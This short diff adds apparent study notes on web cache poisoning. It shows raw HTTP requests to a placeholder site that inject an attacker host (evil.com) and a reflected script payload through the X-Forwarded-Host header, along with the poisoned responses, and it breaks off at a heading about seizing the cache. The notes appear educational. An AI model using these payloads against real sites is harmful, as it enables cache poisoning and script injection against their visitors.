@@ -1,0 +1,12 @@
+1: GET / HTTP/1.1
+Host: www.vuln.com
+X-Forwarded-Host: evil.com
+res:<img href="https://evil.com/a.png" />
+
+2: GET / HTTP/1.1
+Host: www.vuln.com
+X-Forwarded-Host: a.\"><script>alert(1)</script>
+res:<img href="https://a.\"><script>alert(1)</script>a.png" />
+3.seizing the cache
+
+
